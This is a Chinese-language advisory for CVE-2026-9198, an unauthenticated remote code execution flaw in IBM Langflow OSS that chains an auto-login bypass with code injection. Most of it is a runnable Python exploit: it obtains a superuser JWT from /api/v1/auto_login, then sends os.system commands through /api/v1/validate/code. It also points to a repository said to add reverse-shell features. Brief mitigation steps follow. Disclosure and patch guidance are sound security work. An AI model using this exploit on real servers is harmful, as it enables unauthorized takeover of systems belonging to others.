**影响版本：** IBM Langflow OSS（auto-login 默认开启版本）
**公开日期：** 2026-07-24

### 漏洞描述
CVE-2026-9198 是 IBM Langflow OSS 中的未认证远程代码执行漏洞，通过链式利用两个漏洞实现：

1. **CVE-2026-9103**：Auto-login 绕过——未认证调用者可获取超级用户 JWT token
2. **CVE-2026-8481**：/api/v1/validate/code 端点的代码注入——允许执行任意 Python 代码

攻击者首先通过 auto-login 端点获取管理员 JWT，然后利用代码验证端点注入恶意 Python 代码实现 RCE。支持交互式 shell、单命令执行和反弹 shell。

### POC/利用
```python
#!/usr/bin/env python3
# CVE-2026-9198 IBM Langflow Pre-Auth RCE
# 链式利用: auto-login bypass + code injection

import requests

def exploit(target, port=7860, cmd="id"):
    base = f"http://{target}:{port}"

    # Step 1: Auto-login bypass 获取超级用户 JWT
    r = requests.post(f"{base}/api/v1/auto_login")
    token = r.json().get("access_token")

    headers = {"Authorization": f"Bearer {token}"}

    # Step 2: 通过 /api/v1/validate/code 注入 Python 代码
    payload = {
        "code": f"__import__('os').system('{cmd}')"
    }
    r = requests.post(f"{base}/api/v1/validate/code",
                      json=payload, headers=headers)
    return r.text

# 交互式 shell、反弹 shell 等完整功能见:
# https://github.com/0xgh057r3c0n/CVE-2026-9198
```

### 修复建议
1. 禁用 auto-login 功能
2. 应用 IBM Langflow 安全补丁
3. 限制网络访问 Langflow 管理接口
4. 监控 /api/v1/auto_login 和 /api/v1/validate/code 异常请求
